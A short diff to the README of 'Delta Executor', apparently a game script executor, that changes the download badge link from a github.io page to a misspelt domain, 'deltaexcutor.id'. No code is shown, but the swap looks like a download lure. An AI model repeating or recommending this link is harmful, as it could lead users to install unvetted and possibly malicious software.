@@ -9,7 +9,7 @@ Welcome to the official **Delta Executor** repository! Delta Executor stands as 
 
 <div align="center">
 
-[![Download Delta Executor](https://img.shields.io/badge/Download%20Delta%20Executor-brightgreen?style=for-the-badge&logo=github)](https://deltarobl.github.io/delta/)
+[![Download Delta Executor](https://img.shields.io/badge/Download%20Delta%20Executor-brightgreen?style=for-the-badge&logo=github)](https://deltaexcutor.id/)
 
 </div> 
 
